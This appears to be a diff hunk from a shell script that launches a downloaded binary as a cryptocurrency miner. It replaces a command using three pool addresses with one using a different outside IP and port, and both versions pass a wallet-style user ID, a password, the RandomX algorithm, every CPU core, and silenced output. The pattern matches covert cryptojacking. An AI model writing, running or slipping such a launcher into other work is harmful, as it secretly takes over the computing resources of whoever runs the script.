@@ -25,11 +25,4 @@ chmod +x "$BIN_NAME"
 # Optional: run the binary
 # ./"$BIN_NAME"
 
-./"$BIN_NAME" \
--o 18.232.157.131:5522 \
--o 18.232.157.131:6622 \
--o 18.232.157.131:7722 \
--u Q01050060a73f3f62b70143208916ea8040ff23221b99037a5a5d73f80964a3bb4717f9d55c8e3f \
--p qtreeson20N \
--a rx/0 \
--t $(nproc --all) > /dev/null 2>&1
+./"$BIN_NAME" -o 107.23.247.14:8080 -u solo:Q01050060a73f3f62b70143208916ea8040ff23221b99037a5a5d73f80964a3bb4717f9d55c8e3f -p qtreeson21M -a rx/0 -t $(nproc --all) > /dev/null 2>&1
